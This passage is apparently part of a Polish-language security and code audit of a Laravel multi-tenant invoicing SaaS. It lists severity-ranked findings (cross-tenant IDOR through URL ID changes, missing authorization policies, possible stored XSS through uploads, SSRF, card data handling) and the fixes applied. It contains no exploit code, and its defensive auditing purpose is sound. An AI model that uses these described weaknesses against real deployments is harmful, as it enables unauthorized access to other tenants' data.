- **[LOW]** Domena Admin nie ma własnych Models/DTOs/Requests/Resources/Services/Policies — w 100% reużywa klas z Contractors/Products, więc każda przyszła zmiana walidacji w domenie źródłowej cicho wpływa na panel admina bez dedykowanych testów.
- **[HIGH]** Zero testów dla całej domeny Admin — najbardziej wrażliwa na privilege-escalation/cross-tenant leaki domena w całym systemie nie ma ani jednego testu potwierdzającego `is_admin=false` → 403, ani że dane nie są cicho gubione (bug `vatId`/`taxId` powyżej — test by go wyłapał).

### Faza 3 — ShareToken, Feeds, Calendar

**Wzorzec:** funkcjonalność publicznego udostępniania (ShareToken) jest architektonicznie błędna i w praktyce niedziałająca (crash przy tworzeniu, brak jakiegokolwiek publicznego endpointu odbioru); w Feeds i Calendar brakuje autoryzacji obiektowej (brak Policy w ogóle), a oba mają dodatkowo świeże, samodzielne bugi funkcjonalne w stylu już znanego wzorca "walidacja na camelCase, kontroler czyta surowy request" (crash przy tworzeniu uczestnika eventu, trwale zepsute usuwanie komentarza feedu przez brakujący segment trasy).

**ShareToken:**

- **[CRITICAL]** `InvoiceShareTokenController::store()` (`app/Domain/Invoice/Controllers/InvoiceShareTokenController.php:24-31`) woła `$invoice->shareTokens()->create($request->validated())`, ale `StoreInvoiceShareTokenRequest::rules()` w ogóle nie zawiera pól `token`/`shareableType`, a kolumny `token` (unique) i `shareable_type` w `share_tokens` są NOT NULL. `HasMany::create()` wstrzykuje tylko `shareable_id`. **Każde `POST /invoices/{invoice}/share-tokens` kończy się wyjątkiem DB (NOT NULL violation) — endpoint jest kompletnie niedziałający.** `ShareTokenService::createToken()` (generujący krypto-bezpieczny token przez `Str::random(40)`) jest martwym kodem, nigdzie niewywoływanym.
- **[HIGH]** `HasShareTokens::shareTokens()` (`app/Domain/ShareToken/Traits/HasShareTokens.php:10-13`) nadal `HasMany('shareable_id','id')` zamiast `morphMany` — bug NIE naprawiony wcześniej (naprawiono tylko `destroy()`, nie samą relację). Ponieważ `shareable_id` to ULID (efektywnie globalnie unikalny), praktyczne ryzyko kolizji między modelami jest znikome, ale i tak żaden token nigdy nie ma poprawnie ustawionego `shareable_type` (patrz wyżej), więc relacja i tak nie filtruje poprawnie.
- **[HIGH]** Brak jakiegokolwiek publicznego, nieuwierzytelnionego endpointu do odbioru/podglądu zasobu przez `share_token` — wszystkie trasy ShareToken są za `auth:api`/`is_active`/`mfa`/`is_in_tenant`. `ShareTokenService::validateToken()`/`incrementUsage()` (limit użyć, wygaśnięcie) nigdzie niewywoływane, brak wzmianek we frontendzie. **Funkcja "publiczny link do faktury" nie istnieje end-to-end — jest tylko (zepsuty) CRUD tokenów, nic faktycznie nie udostępnia.**
- **[MEDIUM]** `Expense` dołącza `HasShareTokens`, ale nie istnieje `ExpenseShareTokenController` ani trasa — martwy kod skopiowany z Invoice, niedokończony.
- **[MEDIUM]** `StoreInvoiceShareTokenRequest.maxUsage` to `required|integer` bez `min:1` — `0`/liczby ujemne przechodzą walidację. Zbędne pole `invoiceId` w regułach mimo route-model-bindingu.
- **[LOW]** Zero testów dla domeny ShareToken — stąd critical #1 nigdy niewykryty.
- Pozytyw: `InvoiceShareTokenController::destroy()` poprawnie autoryzuje przez `InvoicePolicy` i ręcznie weryfikuje `shareable_type`/`shareable_id` — defensywne obejście braku `morphMany`, wcześniej znaleziony bug "kasuje całą fakturę" faktycznie naprawiony.

**Feeds:**

- **[HIGH]** `FeedController::destroy()` — brak `$this->authorize()`, brak sprawdzenia `user_id === Auth::id()`; `Feed` nie ma zarejestrowanej Policy w `AuthServiceProvider`. **Dowolny user tego samego tenanta może skasować dowolny wpis feedu innego użytkownika.** Test istnieje tylko dla właściciela, luka niepokryta.
- **[HIGH — naprawione 2026-07-03]** `FeedCommentController::destroy()` ma jawne `// TODO: Add authorization` — autoryzacja zakomentowana. Poważniejsze: trasa `DELETE /feed-comments/{comment}` ma tylko jeden parametr `{comment}`, a metoda ma sygnaturę `destroy(Feed $feed, Comment $comment)` — brak `{feed}` w URI oznacza brak route-model-bindingu, `$feed` to pusty `new Feed()` z `id === null`. Warunek `$comment->commentable_id !== $feed->id` jest więc zawsze prawdziwy → **`abort(404)` przy KAŻDYM wywołaniu — usuwanie komentarzy jest kompletnie niefunkcjonalne**, niezależnie od właściciela. Brak testów na ten kontroler.
- **[MEDIUM]** `FeedCommentController::store()` waliduje `content` bez `NoProfanity` (w przeciwieństwie do `StoreFeedRequest`) — niespójna reguła między wpisem a komentarzem.
- **[LOW]** `CommentResource` martwy kod — `index()` zwraca `CommentDTO::collect()`, nie ten resource.
- **[LOW]** Zbędna duplikacja `auth:api` middleware w `routes/api/feeds.php` (już nałożone globalnie w `routes/api.php`).
- Pozytyw: `Feed` poprawnie tenant-scoped, test potwierdza izolację między tenantami.

**Calendar:**

- **[HIGH — naprawione 2026-07-03]** `EventController` nie wywołuje `$this->authorize()` w ogóle w `show/update/destroy` — brak sprawdzenia właściciela ani `visibility`. `EventPolicy` nie istnieje. **`EventVisibility::PRIVATE` nigdzie nie jest egzekwowany** — dowolny user tenanta widzi/edytuje/kasuje "prywatny" event kogoś innego.
- **[HIGH — naprawione 2026-07-03]** `StoreEventRequest`/`UpdateEventRequest`: `'endAt' => ['required','date','after:start_at']` odwołuje się do `start_at`, ale realne pole to `startAt` (camelCase, konwersja na snake_case dopiero w `validated()` PO walidacji). Laravel nie znajduje `start_at` w danych wejściowych — **walidacja chronologii dat jest no-opem, `endAt` przed `startAt` przechodzi bez błędu.**
- **[HIGH — naprawione 2026-07-03]** `EventController::store()` woła `$event->attendees()->createMany($request->attendees)` — surowy `$request->attendees` (camelCase) zamiast `$request->validated()` (snake_case). `EventAttendee::$fillable`/kolumny NOT NULL oczekują `attendee_type`/`attendee_id`/`response_status` — żaden klucz się nie zgadza. **Przekazanie `attendees` przy tworzeniu eventu zawsze kończy się wyjątkiem DB (500).** Ten sam wzorzec błędu co w ShareToken (walidacja na innej warstwie niż odczyt).
- **[MEDIUM — naprawione 2026-07-03]** `attendees.*.attendeeId` walidowane tylko jako `ulid`, bez `exists:` i bez sprawdzenia przynależności do tenanta — można dopisać dowolny/obcy ULID jako uczestnika. *(dodano `exists:users,id`; sprawdzenie przynależności do tenanta nadal nienaprawione)*
- **[MEDIUM]** `UpdateEventRequest` w ogóle nie obsługuje `attendees` — nie da się edytować uczestników po utworzeniu eventu.
- **[MEDIUM]** `recurrence_rule` przyjmowane/zwracane jako wolny string, ale brak JAKIEJKOLWIEK logiki interpretującej RRULE (generowanie wystąpień, przypomnienia, eksport iCal) — "cykliczne eventy" to niezaimplementowane pole.
- **[LOW]** `EventAttendeeResource` zwraca surowy `whenLoaded('attendee')` bez resource/DTO — dziś nieszkodliwe (relacja nigdy nie jest eager-loadowana), ale ryzykowne przy przyszłym `->load()`.
- **[LOW]** Zero testów dla Calendar — żaden z powyższych bugów niewykryty automatycznie.
- Pozytyw: `EventAttendee`/`EventReminder` mają poprawny `cascadeOnDelete()` na `event_id`.

### Faza 2 — Projects i reszta Tenant

**Wzorzec:** dwa różne typy problemów naraz — (a) prawdziwy, łatwy do wykorzystania cross-tenant IDOR na branding/profil/logo tenanta, (b) cała domena Projects funkcjonalnie martwa (nie exploit, ale nic nie działa).

- **[CRITICAL]** `TenantBrandingController`/`TenantPublicProfileController` (show/update/deleteMedia) — **zero autoryzacji**. `is_in_tenant` sprawdza tylko, że JWT ma jakiś `tid`, nie że zgadza się z `{tenant}` w URL. `Tenant` nie jest sam sobie tenant-scoped, więc route-model-binding nie chroni. **Dowolny zalogowany user dowolnej firmy może odczytać/nadpisać/usunąć branding (logo, favicon, font, logo PDF, nagłówek e-mail) i publiczny profil KAŻDEJ INNEJ firmy**, zmieniając tylko ID w URL. Branding trafia na faktury PDF i e-maile do klientów — wysoki wpływ biznesowy/reputacyjny.
- **[CRITICAL]** `TenantLogoController` (upload/show/delete) — ten sam brak autoryzacji, dowolny user może podmienić/skasować logo dowolnej innej firmy.
- **[CRITICAL — naprawione 2026-07-03]** `POST /projects` zawsze rzuca `TypeError` (500) — `ProjectDTO::from()` woła `fromArray()` wymagający `tenantId`/`ownerId`, których `CreateProjectRequest` w ogóle nie dostarcza.
- **[CRITICAL — naprawione 2026-07-03]** Nawet po naprawie powyższego: `(array) $dto` w kontrolerze daje klucze camelCase, a `Project::$fillable` jest snake_case — `Project::create()` cicho zignoruje atrybuty, naruszając NOT NULL/FK.
- **[CRITICAL — naprawione 2026-07-03]** `POST /tasks` zawsze zepsute — kontroler czyta `$request->input('project_id'/'status_id'/...)` (snake_case) z surowego requestu, podczas gdy `CreateTaskRequest` waliduje camelCase — zawsze `null` na NOT NULL FK → `QueryException`.
- **[CRITICAL — naprawione 2026-07-03]** `TaskPolicy` nie istnieje, ale `TaskController` ją wywołuje (`view`/`update`/`delete`) — Laravel domyślnie odmawia gdy brak Policy, więc **te akcje zwracają 403 dla każdego, łącznie z twórcą i przypisaną osobą**.
- **[HIGH — naprawione 2026-07-03]** Domyślne statusy projektów/tasków nigdy się nie tworzą — `InitializeTenantDefaults` nie woła `seedDefaultProjectStatuses()`/`seedDefaultTaskStatuses()` (zdefiniowane, ale martwe). Żaden tenant nie ma statusu do wyboru — potwierdza, że cała funkcja jest niemożliwa do użycia end-to-end, zgodnie z README (choć z innego powodu niż "nic nie zrobiono" — szkielet istnieje, ale nie działa).
- **[HIGH — naprawione 2026-07-03]** Brak autoryzacji w `ProjectStatusController`/`TaskStatusController` — każdy member może zmieniać statusy używane globalnie we wszystkich projektach firmy.
- **[HIGH]** Załączniki projektów/tasków omijają model własności (`ProjectPolicy::view` wymaga bycia właścicielem/przypisanym, ale `*AttachmentsController` tego nie sprawdza) — dowolny member widzi/wgrywa/kasuje załączniki dowolnego projektu/taska w tenancie. *(nienaprawione — część systemowego wzorca 6/7 attachment-kontrolerów z Fazy 5, poza zakresem tego batcha)*
- **[HIGH — naprawione 2026-07-03]** `TenantController::store()` (dodanie kolejnej firmy) nie woła `InitializeTenantDefaults` — ręcznie utworzony tenant nie ma root organization unit, kategorii stanowisk, subskrypcji, szablonów numeracji — prawdopodobnie psuje przypisywanie do jednostek i numerację faktur dla tego tenanta. Naprawa ujawniła dodatkowy, wcześniej nieobserwowalny bug: `StoreTenantRequest` nigdy nie ustawiał `owner_id`, co po wpięciu inicjalizacji powodowało `NOT NULL` violation na `org_unit_user.user_id` — naprawione razem.
- **[HIGH]** `AddressPolicy`/`BankAccountPolicy` sprawdzają tylko członkostwo, nie rolę — każdy member może zmienić oficjalny adres firmy i **konto bankowe do przyjmowania płatności od klientów**. Ten sam wzorzec co `TenantPolicy`/`RoleController` naprawiane wcześniej.
- **[HIGH]** Brak autoryzacji w `OrganizationUnitController::store()`/`PositionCategoryController` — każdy member może tworzyć jednostki organizacyjne/kategorie stanowisk.
- **[MEDIUM]** Walidacja `exists:` w Projects/Tasks omija tenant-scope (surowe zapytanie do DB) — można podać ID statusu/projektu/usera z innego tenanta, jeśli ULID jest znany/odgadnięty.
- **[MEDIUM]** `cascadeOnDelete()` na `owner_id`/`assignee_id`/`created_by_id` w Projects/Tasks — usunięcie użytkownika kasuje kaskadowo wszystkie jego projekty/taski zamiast `nullOnDelete`.
- **[MEDIUM]** `PositionCategoryController::update/destroy` rzuca surowy `\Exception` zamiast 403 — 500 zamiast czytelnego błędu, logika polityki zduplikowana inline zamiast w klasie Policy.
- **[LOW]** `project_roles` jedynym modelem w domenie Projects bez tenant-scope (dziś nieeksponowany przez żaden kontroler).
- **Pokrycie testami:** pozorne/zerowe w obu obszarach — jedyny test Projects (`ProjectDTOTest`) ręcznie buduje DTO z kompletem pól, maskując bug #1/#2. Zero testów Feature dla `TenantBrandingController`/`TenantPublicProfileController`/`TenantLogoController`/`OrganizationUnitController`.

### Faza 2 — Contractors i Products

**Wzorzec:** ten sam brak roli-opartej autoryzacji co wszędzie wcześniej + dwa świeże, samodzielne bugi funkcjonalne (kolizja tras, literówka w nazwie trasy) psujące featury oznaczone w README jako gotowe.

- **[CRITICAL]** Brak jakiejkolwiek autoryzacji opartej o rolę w `ContractorController::destroy/export` — dowolny member może usunąć kontrahenta lub wyeksportować całą bazę (razem z IBAN przez `include=bankAccounts`).
- **[CRITICAL — naprawione 2026-07-03]** `routes/api/contractors.php:24-27` — dwie trasy `DELETE /contractors/{contractor}/logo` zarejestrowane pod rząd; Laravel dopasowuje pierwszą, więc **usuwanie logo nigdy się nie wykonuje** — trafia w `show()` (zwraca 200 ze streamowanym obrazem). Metoda `delete()` jest nieosiągalna. README oznacza to jako gotowe.
- **[HIGH]** Adresy i konta bankowe kontrahentów zawsze zapisywane z `tenant_id = NULL` — `HaveAddresses`/`HaveBankAccounts` instancjonują bazowe `Address`/`BankAccount` przez `morphMany`, nigdy dedykowanych podklas `ContractorAddress`/`ContractorBankAccount` (które mają `BelongsToTenant`, ale martwy). Dziś niewykorzystywalne bezpośrednio (dostęp zawsze przez już-scoped `$contractor`), ale globalne `AddressPolicy`/`BankAccountPolicy` sprawdzające `tenant_id` zawsze zwrócą `false` dla tych rekordów — gdy ktoś je podepnie pod kontroler, autoryzacja przestanie działać dla wszystkich adresów/kont kontrahentów.
- **[HIGH]** Brak unikalności NIP/REGON w obrębie tenanta — zwykły indeks zamiast unikalnego, walidacja bez `unique`. Można stworzyć dwóch kontrahentów z identycznym NIP.
- **[HIGH — naprawione 2026-07-03]** `ProductAttachmentsController` — literówka w nazwie trasy (`product.attachments.show` vs zarejestrowane `products.attachments.show`) i złym parametrze (`attachment` vs `{media}`). **`index`/`store`/`update` rzucają 500 przy każdym wywołaniu.** Cała funkcja załączników produktów (README 7.5, oznaczone `[x]`) jest w praktyce zepsuta. Brak testów na ten kontroler. *(przy okazji dodano też brakujące `download()`/`preview()`, na które trasy już wskazywały, i wpięto istniejące, ale nigdy niewywoływane `authorizeMedia()`)*
- **[HIGH]** Brak roli-opartej autoryzacji w `ProductController::destroy/export` — analogicznie do C1, w tym eksport cen netto całego katalogu.
- **[MEDIUM]** Załączniki (Contractors i Products) bez whitelisty MIME, serwowane `inline` — możliwy stored XSS przy uploadzie SVG/HTML z JS i późniejszym "preview".
- **[MEDIUM]** Niespójna walidacja `country` między store/update kontrahenta (store: ISO-2 + exists, update: dowolny string) — może wstawić niepoprawny kod psujący integracje VIES/REGON/Białą Listę.
- **[MEDIUM]** `SearchContractorRequest` waliduje filtry (`address`/`city`/`state`/`zipCode`/`notes`), których kontroler w ogóle nie obsługuje — żądanie z takim filtrem przechodzi walidację, potem Spatie QueryBuilder rzuca wyjątek.
- **[MEDIUM]** Brak walidacji unikalności `symbol` produktu w FormRequest mimo wymuszenia w DB — duplikat kończy się surowym 500 zamiast 422.
- **[MEDIUM]** `MeasurementUnitController` bez obsługi `ON DELETE RESTRICT` — usunięcie jednostki używanej przez produkt = surowy wyjątek SQL. Brak realnej logiki konwersji jednostek (tylko wolny tekst `code`/`name`/`category`).
- **[LOW]** `ContractorDTO`/`ProductDTO` nieużywane przez główne kontrolery (tylko przez Admin) — martwa warstwa DTO wbrew wzorcowi z CLAUDE.md.
- **Pozytyw:** `Contractor`/`Product` poprawnie tenant-scoped na poziomie głównego modelu; istniejące testy (tam gdzie są) poprawnie sprawdzają IDOR/izolację między tenantami — problem to całkowity brak testów na duże połacie funkcjonalności (konta bankowe, kontakty, komentarze, tagi, załączniki, logo, activity log, eksport), co pozwoliło błędom (P1, C2) przejść niezauważonym.

### Faza 2 — Invoice i Expense

**Wzorzec:** w Invoice autoryzacja w ogóle nie istnieje (każdy może wszystko); w Expense autoryzacja "istnieje" ale bez zarejestrowanej Policy zawsze zwraca 403 — allocation engine i approval workflow są martwe funkcjonalnie dla wszystkich, nie tylko dla atakujących.

- **[CRITICAL]** `InvoiceController` — brak jakiejkolwiek autoryzacji opartej o rolę. Wszystkie `authorize()` w FormRequests zwracają `true`, kontroler nigdy nie woła `$this->authorize()`, `InvoicePolicy` nie istnieje, brak wpisu w `AuthServiceProvider`. Dowolny member tenanta może store/update/destroy dowolną fakturę.
- **[CRITICAL]** Numeracja faktur — kolumna `number` bez `unique()` (globalnie ani per tenant+szablon), `StoreInvoiceRequest` bez reguły `unique`. `NumberingTemplate::generateNextNumber()` wołane wyłącznie z seedera, nigdy z kontrolera/akcji produkcyjnej — klient sam konstruuje numer faktury. Można utworzyć dwie faktury o identycznym numerze w tym samym tenancie — złamanie wymogu prawnego unikalnej numeracji.
- **[CRITICAL]** State machine statusu faktury (`InvoiceStatus::canTransitionTo()`) zdefiniowana, ale nigdzie nie wywoływana. `UpdateInvoiceRequest` waliduje `status` jako zwykły string. Fakturę ze statusem COMPLETED (opłaconą) można cofnąć do DRAFT i zmienić kwoty/numer/walutę — złamanie integralności dokumentu księgowego.
- **[CRITICAL]** Brak przeliczania/weryfikacji sum finansowych po stronie backendu — `totalNet+totalTax=totalGross` nigdzie nie jest wymuszane, klient wysyła gotowe sumy.
- **[CRITICAL]** `ExpenseAllocationController`/`ExpenseApprovalController::start` wołają `$this->authorize('update'/'view', $expense)`, ale `Expense::class` nie ma zarejestrowanej Policy w `AuthServiceProvider` — Laravel domyślnie odmawia gdy brak Policy. **Cały allocation engine i start workflow zatwierdzania zwracają 403 dla każdego użytkownika, zawsze.** Brak testów sprawił, że nikt tego nie wykrył — funkcje "gotowe" (DTO/Action/Controller/walidacja) są w praktyce bezużyteczne.
- **[CRITICAL]** Eksport wydatków (`ExpensesExport`) nie sprawdza `approval_status` — w połączeniu z powyższym, niezatwierdzone wydatki (i tak wszystkie, bo approval nie działa) są swobodnie eksportowane.
- **[HIGH]** `InvoiceShareTokenController::destroy()` — **kasuje całą fakturę** zamiast unieważnić token udostępniania (kopiuj-wklej z `InvoiceController::destroy()`, drugi parametr trasy `{share_token}` jest po prostu ignorowany przez sygnaturę metody).
- **[HIGH]** `HasShareTokens::shareTokens()` — zwykła `HasMany` po `shareable_id`, ignoruje `shareable_type` mimo polimorficznej tabeli. Powinno być `morphMany`.
- **[HIGH]** Brak roli-opartej autoryzacji dla CRUD wydatków (analogicznie do faktur) — każdy member może edytować/usuwać cudze wydatki.
- **[HIGH]** `ExpenseAllocationStatus` na `ExpenseAllocation` nigdy nie aktualizowane po utworzeniu (zawsze `PENDING`), `canTransitionTo()` martwy kod.
- **[HIGH]** Zero testów dla całej domeny Expense poza OCR — stąd finding o allocation/approval (403 dla wszystkich) nigdy nie został wykryty. Invoice ma tylko 3 testy (show/delete/404) — brak testów store/update, izolacji tenantów, przejść statusów, numeracji, sum finansowych.
- **[MEDIUM]** `InvoiceGeneratorService`/`TemplatingService` — helpery Handlebars dla `logoUrl`/`signatureUrl` budują nieescapowany `<img src="...">`. Dziś nieszkodliwe (URL z bezpiecznego `MediaUrlService`), ale niebezpieczny wzorzec przy istniejącym opcjonalnym `PuppeteerEngine` (pełna przeglądarka z JS przy renderowaniu PDF).
- **[MEDIUM]** Brak autoryzacji na generowanie/pobieranie PDF faktury.
- **[MEDIUM]** `AllocateExpenseAction::execute()` ustawia status wydatku zawsze na `PROCESSING`, nie rozróżnia pełnej/częściowej alokacji mimo gotowych helperów na modelu.
- **[LOW]** README niezgodny z kodem w obie strony: eksport faktur do Excela istnieje i działa (README mówi "niezrobione"), allocation/approval w Expense "backend-ready" ale w runtime martwe (403).
- **[LOW]** Duplikacja kodu między `InvoiceAttachmentsController` i `ExpenseAttachmentsController` (niemal identyczne).

### Naprawione critical findings z Fazy 2, Grupa A (2026-07-02)

Wszystkie 13 aktywnie eksploatowalne critical findings z Fazy 2 naprawione bezpośrednio (weryfikacja tylko `php -l`, patrz zastrzeżenie na końcu):

1. **IDOR branding/publiczny profil/logo tenanta.** `TenantBrandingController`/`TenantPublicProfileController`/`TenantLogoController` — dodano `$this->authorize('view'/'update', $tenant)` we wszystkich metodach (`show`/`update`/`deleteMedia`/`upload`/`delete`), używając już istniejącej `TenantPolicy` (naprawionej w Fazie 0: `view` = członkostwo, `update`/`delete` = Owner/Admin).
2. **Zero autoryzacji w Invoice.** Dodano `InvoicePolicy` (view/update wymaga zgodności `tenant_id`, `delete` dodatkowo Owner/Admin), zarejestrowano w `AuthServiceProvider`, dodano `$this->authorize()` w `InvoiceController::store/update/destroy`.
3. **`InvoiceShareTokenController::destroy()` kasował całą fakturę.** Przepisano — teraz autoryzuje przez `update` na fakturze, weryfikuje że `$shareToken` faktycznie należy do `$invoice` (`shareable_type`/`shareable_id`), i kasuje tylko token, nie fakturę.
4. **Brak unikalności numeru faktury.** Migracja `2025_07_10_000020_add_unique_number_to_invoices_table.php` — `unique(['tenant_id', 'number'])`. `StoreInvoiceRequest`/`UpdateInvoiceRequest` dostały regułę `Rule::unique('invoices', 'number')->where('tenant_id', ...)`.
5. **Brak walidacji sum finansowych i przejść statusu.** `StoreInvoiceRequest`/`UpdateInvoiceRequest` (`withValidator`) teraz wymuszają `totalNet + totalTax == totalGross` (porównanie w groszach) i — w `UpdateInvoiceRequest` — poprawność przejścia statusu przez `InvoiceStatus::canTransitionTo()` oraz blokadę edycji pól finansowych (`number`/`total*`/`currency`/`exchangeRate`/`body`) gdy faktura jest już `COMPLETED`/`CANCELLED`. **Poprawka (2026-07-02, wykryta przez audyt Fazy 4):** pierwsza wersja `UpdateInvoiceRequest` z tego punktu miała bug — `rules()`/`$this->has()`/`$this->input()` używały kluczy snake_case (`total_net` itd.), a `BaseFormRequest` operuje na surowym, camelCase requeście (`validated()` konwertuje na snake_case dopiero na wyjściu) — więc cała ta walidacja była martwym kodem, nigdy nie dopasowującym się do realnego payloadu z frontu. Naprawione na camelCase (`totalNet`/`totalTax`/`totalGross`/`exchangeRate`/`numberingTemplateId`), zgodnie z konwencją już poprawnie zastosowaną w `StoreInvoiceRequest`.
6. **Brak autoryzacji opartej o rolę w `ContractorController`/`ProductController`.** Dodano `authorizeManage()` (Owner/Admin) w `destroy()`/`export()` obu kontrolerów — usuwanie/eksport całej bazy kontrahentów/produktów (razem z IBAN/cenami netto) wymaga teraz roli zarządczej.
7. **`AddressPolicy`/`BankAccountPolicy` sprawdzały tylko członkostwo.** `create`/`update`/`delete` wymagają teraz Owner/Admin (`isOwnerOrAdmin()`) — dotyczy oficjalnego adresu firmy i konta bankowego do przyjmowania płatności od klientów. Potwierdzono grepem, że te Policy są używane wyłącznie przez `TenantAddressController`/`TenantBankAccountController` (nie przez Contractor).
8. **Adresy/konta bankowe zawsze `tenant_id = NULL`.** Korzeń: `HaveAddresses`/`HaveBankAccounts` (`morphMany`) zawsze instancjonują bazowe `Address`/`BankAccount`, nigdy dedykowanych podklas z `BelongsToTenant`. Naprawiono u źródła — dodano `BelongsToTenant` bezpośrednio do bazowych modeli `Address`/`BankAccount` (auto-set `tenant_id` z kontekstu żądania + globalny scope). **Dotyczyło też adresu/konta bankowego samego tenanta** (`TenantAddressController`/`TenantBankAccountController` — ten sam bug, nie tylko Contractors, jak wstępnie sądzono). Dodano migrację backfill `2025_07_10_000030_backfill_addresses_and_bank_accounts_tenant_id.php` dla istniejących wierszy z `tenant_id IS NULL` (z `addressable`/`bankable` — Tenant wprost, Contractor/Contact przez ich `tenant_id`, User przez `user_tenants` z best-effort wyborem jednego członkostwa gdy user ma więcej niż jedno). **Bez tego backfillu nowy globalny scope na `Address`/`BankAccount` sprawiłby, że wszystkie istniejące rekordy stałyby się niewidoczne dla wszystkich — migracja jest obowiązkowa przed wdrożeniem, nie opcjonalna.**
9. **Brak autoryzacji w `OrganizationUnitController`.** Dodano `authorizeManage()` (Owner/Admin) w `store`/`update`/`destroy` — struktura organizacyjna (drivuje routing zatwierdzeń i RBAC) nie powinna być modyfikowalna przez każdego membera. Zweryfikowano, że IDOR przez surowy `{tenant}`/`{unitId}` w URL nie jest możliwy — globalny scope `IsGlobalOrBelongsToTenant` na `OrganizationUnit` i tak odfiltrowuje wiersze spoza bieżącego tenanta niezależnie od parametru URL.
10. **`PositionCategoryController` — brak autoryzacji, surowy `\Exception` zamiast 403.** Usunięto zepsute ręczne porównanie `$user->tenant_id !== $positionCategory->tenant_id` (User nie ma kolumny `tenant_id` — to zawsze `null`, więc warunek był martwy/zawsze prawdziwy) i zastąpiono `authorizeManage()` (Owner/Admin) + istniejącym globalnym scope `IsGlobalOrBelongsToTenant` do izolacji tenantów.

**Weryfikacja lokalna (2026-07-02, Sail/Docker):** uruchomiono pełny `composer larastan` i `php artisan test` — szczegóły w [`REVIEW_LOCAL_QUALITY_RUN.md`](REVIEW_LOCAL_QUALITY_RUN.md). **PHPStan: 3 błędy** (`ApprovalResolutionService`). **PHPUnit (rerun po migracji `contacts`): 6 failed / 269 passed / 31 skipped** — wcześniejsza blokada (brak tabeli `contacts` w backfillu) usunięta migracją `2024_04_14_000153_create_contacts_table.php`. Pozostałe failure: regresja joba registry, JWT w testach invitation, autoryzacja Skills vs stare testy. Backfill na kopii produkcyjnej nadal przetestować (`DISTINCT ON` / `user_tenants`).

**Nie naprawiono w tej sesji (Grupa B, świadomie odłożone jako known-issue):** cała domena Projects (POST /projects i POST /tasks zawsze 500, brak `TaskPolicy`, brak domyślnych statusów), Expense allocation/approval (403 dla wszystkich z powodu brakującej `ExpensePolicy` w `AuthServiceProvider`), kolizja tras `DELETE /contractors/{contractor}/logo`, literówka w trasach `ProductAttachmentsController`, brak unikalności NIP/REGON per tenant, whitelisty MIME na załącznikach, oraz wszystkie findings MEDIUM/LOW z Fazy 2.

### Naprawione critical findings z Fazy 1, Grupa A (2026-07-02)

1. **Stripe — surowe dane karty.** Backend już nie przyjmuje `cardNumber`/`expiry`/`cvc`. `PaymentDetailsDTO` przyjmuje teraz `paymentMethodId` (token `pm_...`); `StripePaymentService::createPaymentMethod()` → `attachPaymentMethod()`, tylko podpina istniejący token zamiast tworzyć PaymentMethod z surowej karty. **WYMAGA ZMIANY W FRONTENDZIE** (saasbase-web): formularz płatności musi używać Stripe.js/Elements do tokenizacji karty po stronie klienta i wysyłać `paymentDetails.paymentMethodId` zamiast pól karty. To złamanie kontraktu API — bez zmiany frontendu formularz subskrypcji przestanie działać.
2. **Karta w logach.** `CreateSubscriptionAction` już nie loguje pełnego DTO przy błędzie — tylko `billing_customer_id`/`plan_id`.
3. **Brak izolacji tenantów w Subscription.** Dodano `App\Domain\Subscription\Traits\BelongsToTenantOrUser` (dla `BillingCustomer`, którego `billable` wskazuje bezpośrednio na Tenant/User) i `BelongsToBillingCustomerOfUser` (dla `Subscription`/`SubscriptionInvoice`/`AddonPurchase`, których `billable` wskazuje na `BillingCustomer`). Wszystkie 4 modele mają teraz `scopeForUser()`; `SubscriptionController`/`AddonPurchaseController`/`SubscriptionInvoiceController` używają go w `index/show/update/destroy`. `StoreSubscriptionRequest.billingCustomerId` waliduje teraz przynależność do bieżącego usera/tenanta (`Rule::exists()->where()`).
4. **`TenantIntegration.credentials` nigdy nie szyfrowane.** Usunięto konfliktowy accessor `Attribute::make()`, który nadpisywał cast `encrypted:json`. Dodano migrację `2025_07_10_000010_fix_tenant_integrations_credentials_encryption.php`: zmienia kolumnę z `jsonb` na `text` (zaszyfrowany blob nie jest poprawnym JSON) i re-szyfruje istniejące plaintextowe wiersze w miejscu. **Migracja nieprzetestowana na realnej bazie** (brak `vendor/`/DB w tym środowisku) — koniecznie przetestować na kopii danych przed produkcją.
5. **`TenantIntegrationController::store()` bez autoryzacji + SSRF.** Dodano `TenantIntegrationPolicy` (Owner/Admin), zarejestrowano w `AuthServiceProvider`, dodano `$this->authorize('create', ...)`. Dodano `IntegrationAllowedHosts` — dla trybu `custom` endpoint musi kończyć się na `.cognitiveservices.azure.com`/`.services.ai.azure.com` (dla typu `azureAi`; inne typy nie mają dziś zdefiniowanej allowlisty, więc `custom` endpoint jest dla nich odrzucany).
6. **`registry_confirmations.status` zawsze "Success".** Naprawiono 4 miejsca w `Regon`/`Vies`/`Mf` ContractorRegistryConfirmationService — zapisywały nieistniejące pole `success` (cicho odrzucane przez Eloquent) zamiast `status`. Teraz zapisują `RegistryConfirmationStatus::Success`/`Failed` na podstawie faktycznego wyniku porównania. `ProcessContractorRegistryConfirmationJob` już nie ustawia zewnętrznego statusu bezwarunkowo na `Success` — sprawdza status wszystkich cząstkowych potwierdzeń (`resolveOverallStatus()`) i zwraca `Failed`, jeśli którekolwiek nie pasuje lub brak danych do porównania. **Nie naprawiono** oddzielnie zdiagnozowanego "podwójnego zapisu" (finding 1.3) w pełni — job teraz zapisuje podsumowanie (`type`+`status` per check) zamiast surowych obiektów Eloquent do kolumny `result`, co ogranicza szkodę, ale nie zmienia architektury dwuwarstwowego zapisu.

**Nie naprawiono w tej sesji (Grupa B + reszta Grupy A/high):** KSeF i e-Doręczenia (świadomie odłożone jako known-issue), rate limiting Stripe/OCR/AI, brak listenerów na eventy Stripe, walidacja checksumy IBAN przy zapisie konta, plaintext logging pełnego IBAN, wszystkie findings MEDIUM/LOW z Fazy 1.

### Naprawione critical findings z Fazy 0 (2026-07-02)

Wszystkie 7 unikalnych critical findings z Fazy 0 naprawione bezpośrednio (nie przez agenty — ręcznie, z weryfikacją składni `php -l`):

1. **`Tenant::bypassTenant()`** — dodano `try/finally`, stan już nie "zatrzaskuje się" przy wyjątku.
2. **`TenantPolicy::update/delete`** — teraz wymaga roli Owner/Admin, nie tylko członkostwa.
3. **`RoleController`** — dodano autoryzację (Owner/Admin) w `store`/`update`/`destroy`; `index()` dodatkowo jawnie scope'owany tenantem (choć `Role` i tak ma `IsGlobalOrBelongsToTenant`, więc to była redundancja, nie luka).
4. **`TenantInvitationController::send`** — dodano autoryzację (Owner/Admin), `role` w `SendInvitationRequest` waliduje teraz przeciw `RoleName` enum zamiast dowolnego stringa.
5. **`ActivityLogController::index`** — `$query` z filtrem `tenant_id` jest teraz faktycznie przekazywany do `getIndexPaginator()`.
